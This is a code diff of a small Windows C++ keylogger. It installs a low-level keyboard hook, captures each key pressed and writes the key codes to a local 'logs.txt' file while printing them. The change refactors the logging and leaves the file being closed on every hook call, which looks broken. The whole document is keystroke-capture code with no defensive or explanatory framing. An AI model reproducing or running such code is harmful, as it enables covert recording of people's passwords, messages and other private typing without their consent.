@@ -13,9 +13,12 @@ HHOOK hook;
 LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);
 
 int filetr;
+ofstream MyFile("logs.txt");
 
 int main()
 {
+
+
     MSG msg;
     hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0);
     if (hook == NULL) {
@@ -34,16 +37,25 @@ int main()
 
 LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam) {
     PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
-    
-    if (wParam == WM_KEYDOWN && codigo == HC_ACTION) {
-        ofstream MyFile("filename.txt");
-        filetr = kbDllHook->vkCode;
-        MyFile << char(filetr);
-        MyFile << "\n";
-        printf("%c", filetr);
-        printf("\n");
-        MyFile.close();
-    }
-    
+
+
+
+        if (wParam == WM_KEYDOWN && codigo == HC_ACTION) {
+        
+            filetr = kbDllHook->vkCode;
+
+            MyFile << char(kbDllHook->vkCode);
+
+            MyFile << "\n";
+
+            printf("%c", kbDllHook->vkCode);
+
+            printf("\n");
+            
+        }
+
+    MyFile.close();
+
     return CallNextHookEx(hook, codigo, wParam, lParam);
 }
+
